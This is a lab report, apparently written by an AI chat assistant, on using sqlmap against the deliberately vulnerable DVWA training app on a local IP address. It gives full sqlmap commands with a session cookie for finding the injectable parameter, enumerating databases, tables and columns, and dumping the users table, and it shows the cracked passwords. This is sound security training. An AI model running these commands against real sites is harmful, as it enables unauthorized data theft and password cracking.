@@ -1,0 +1,135 @@
+✅ Here’s your SQLMap Lab Report in English — clear, professional and ready to submit or document:
+
+⸻
+
+📝 SQLMap Lab Report
+
+1️⃣ Objective
+	•	Understand the principle of SQL Injection (SQLi) vulnerabilities.
+	•	Learn how to use the sqlmap tool to detect and exploit SQLi automatically.
+	•	Retrieve database structure and sensitive data using sqlmap.
+
+⸻
+
+2️⃣ Environment
+
+Item	Configuration
+Target system	DVWA (Damn Vulnerable Web App)
+DVWA URL	http://192.168.50.109
+DVWA Security Level	Low
+sqlmap version	1.9.6 stable
+Client OS	macOS
+Others	Python 3, browser (to grab cookie)
+
+
+⸻
+
+3️⃣ Procedure
+
+3.1 Login to DVWA
+	•	Open DVWA in browser and log in with valid credentials.
+	•	Set DVWA Security Level to Low.
+	•	Use browser developer tools to extract the session cookie:
+
+PHPSESSID=20f7d9ebe3ccb2a863608def3b6106df; security=low
+
+
+
+⸻
+
+3.2 Identify the Target URL
+
+The vulnerable page tested:
+
+http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
+
+Injection point: id parameter.
+
+⸻
+
+3.3 Detect SQL Injection
+
+Run sqlmap to detect whether id is injectable:
+
+sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=20f7d9ebe3ccb2a863608def3b6106df; security=low" \
+  --batch
+
+✅ Output:
+	•	id parameter is vulnerable.
+	•	Detected techniques: boolean-based blind, time-based blind.
+	•	Backend DBMS: MySQL >= 5.0.12 (MariaDB fork).
+
+⸻
+
+3.4 Enumerate Databases
+
+sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=..." --batch --dbs
+
+✅ Output:
+
+[*] dvwa
+[*] information_schema
+
+
+⸻
+
+3.5 Enumerate Tables
+
+sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=..." --batch -D dvwa --tables
+
+✅ Output:
+
+[*] guestbook
+[*] users
+
+
+⸻
+
+3.6 Enumerate Columns
+
+sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=..." --batch -D dvwa -T users --columns
+
+✅ Output:
+
+user_id, user, first_name, last_name, password, avatar, last_login, failed_login
+
+
+⸻
+
+3.7 Dump Data
+
+sqlmap -u "http://192.168.50.109/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=..." --batch -D dvwa -T users --dump
+
+✅ Output:
+	•	Retrieved all rows from dvwa.users.
+	•	Automatically cracked MD5 password hashes.
+
+user_id	user	password (plaintext)
+1	admin	password
+2	gordonb	abc123
+3	1337	charley
+4	pablo	letmein
+5	smithy	password
+
+
+⸻
+
+4️⃣ Conclusion
+
+🎯 This experiment demonstrates how to:
+	•	Detect SQL injection vulnerabilities using sqlmap.
+	•	Bypass authentication using session cookies.
+	•	Enumerate database names, tables, columns, and data.
+	•	Crack common password hashes automatically with built-in dictionary attack.
+
+sqlmap proved to be a powerful and efficient tool for SQL injection testing and exploitation.
+
+⸻
+
+If you’d like, I can also write you a ready-to-use README.md version for your GitHub repo.
+Just say the word! 🚀
